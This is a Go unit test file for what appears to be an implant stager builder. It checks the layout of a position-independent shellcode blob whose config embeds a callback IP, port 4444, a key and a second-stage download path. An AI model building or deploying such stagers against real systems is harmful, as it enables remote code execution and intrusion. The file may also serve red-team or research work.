package stager

import (
	"encoding/binary"
	"net"
	"strings"
	"testing"
)

func TestBuildLayout(t *testing.T) {
	cfg := Config{
		IP:   net.IPv4(192, 168, 1, 33).To4(),
		Port: 4444,
		Key:  make([]byte, 32),
		Path: "/stage/0123456789abcdef?raw=1",
	}
	for i := range cfg.Key {
		cfg.Key[i] = byte(i)
	}

	blob, err := Build(cfg)
	if err != nil {
		t.Fatalf("Build: %v", err)
	}

	want := prologueSize + len(stagerBlob) + configSize
	if len(blob) != want {
		t.Fatalf("blob size = %d, want %d", len(blob), want)
	}

	configOff, _ := Describe(blob)

	// prologue: call $+5; pop rax; lea rdi,[rax+disp]; jmp
	if blob[0] != 0xE8 || blob[5] != 0x58 {
		t.Fatalf("prologue start mismatch: % x", blob[:6])
	}
	if blob[6] != 0x48 || blob[7] != 0x8D || blob[8] != 0xB8 {
		t.Fatalf("expected lea rdi,[rax+d32]: % x", blob[6:9])
	}
	if blob[13] != 0xE9 {
		t.Fatalf("expected jmp at offset 13: % x", blob[13:14])
	}

	// lea rdi displacement
	disp := int32(binary.LittleEndian.Uint32(blob[9:13]))
	if int(disp) != configOff-5 {
		t.Fatalf("lea disp = %d, want %d", disp, configOff-5)
	}
	// jmp displacement: jmp is at offset 13, next insn at 18, target = 18+disp
	jmp := int32(binary.LittleEndian.Uint32(blob[14:18]))
	if int(jmp) != stagerEntry {
		t.Fatalf("jmp disp = %d, want %d", jmp, stagerEntry)
	}

	// config block
	if binary.LittleEndian.Uint32(blob[configOff:configOff+4]) != magicWISP {
		t.Fatalf("config magic mismatch")
	}
	if !strings.EqualFold(string(blob[configOff+4:configOff+8]), string([]byte{192, 168, 1, 33})) {
		t.Fatalf("config ip mismatch")
	}
	if binary.LittleEndian.Uint16(blob[configOff+8:configOff+10]) != 4444 {
		t.Fatalf("config port mismatch")
	}
	key := blob[configOff+10 : configOff+42]
	for i := range key {
		if key[i] != byte(i) {
			t.Fatalf("config key[%d] = %d", i, key[i])
		}
	}
	if string(blob[configOff+42:configOff+42+len(cfg.Path)]) != cfg.Path {
		t.Fatalf("config path mismatch")
	}

	t.Logf("stager blob: %d bytes (code %d, config %d)", len(blob), prologueSize+len(stagerBlob), configSize)
}

func TestResolveIP(t *testing.T) {
	cases := []struct {
		in   string
		want string
		err  bool
	}{
		{"127.0.0.1", "127.0.0.1", false},
		{"10.0.0.5", "10.0.0.5", false},
		{"::1", "", true},
		{"", "", true},
	}
	for _, c := range cases {
		ip, err := ResolveIP(c.in)
		if c.err {
			if err == nil {
				t.Errorf("ResolveIP(%q): expected error, got %v", c.in, ip)
			}
			continue
		}
		if err != nil {
			t.Errorf("ResolveIP(%q): %v", c.in, err)
			continue
		}
		if ip.String() != c.want {
			t.Errorf("ResolveIP(%q) = %s, want %s", c.in, ip, c.want)
		}
	}
}

func TestParseURL(t *testing.T) {
	host, port, path, err := ParseURL("http://192.168.1.33:4444/stage/abc")
	if err != nil {
		t.Fatal(err)
	}
	if host != "192.168.1.33" || port != 4444 || path != "/stage/abc" {
		t.Fatalf("ParseURL got (%s, %d, %s)", host, port, path)
	}
}
